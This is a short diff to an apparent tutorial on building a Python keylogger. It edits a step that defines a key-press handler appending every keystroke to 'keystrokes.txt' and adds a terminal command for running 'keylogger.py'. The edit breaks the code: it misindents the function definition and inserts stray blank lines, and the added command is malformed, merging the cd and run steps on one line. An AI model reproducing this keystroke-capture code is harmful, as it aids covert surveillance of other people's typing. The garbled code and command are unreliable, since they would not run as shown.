@@ -29,8 +29,10 @@ log_file = 'keystrokes.txt'
 # Step 4
 Create the Key Press Event Function
 
-def on_key_press(event):
+    def on_key_press(event):
+
     with open(log_file, 'a') as f:
+    
         f.write('{}\n'.format(event.name))
         
 # Step 5 
@@ -54,6 +56,7 @@ function to accomplish this.
 
 # Step 7
 Open your command prompt or terminal, navigate to the directory where the script is located, and execute the command:
+cd (directory where file is stored) py keylogger.py
 
 ![Screenshot 2024-07-29 122614](https://github.com/user-attachments/assets/f943a530-664c-4562-bb25-b1f051e2e85f)
 
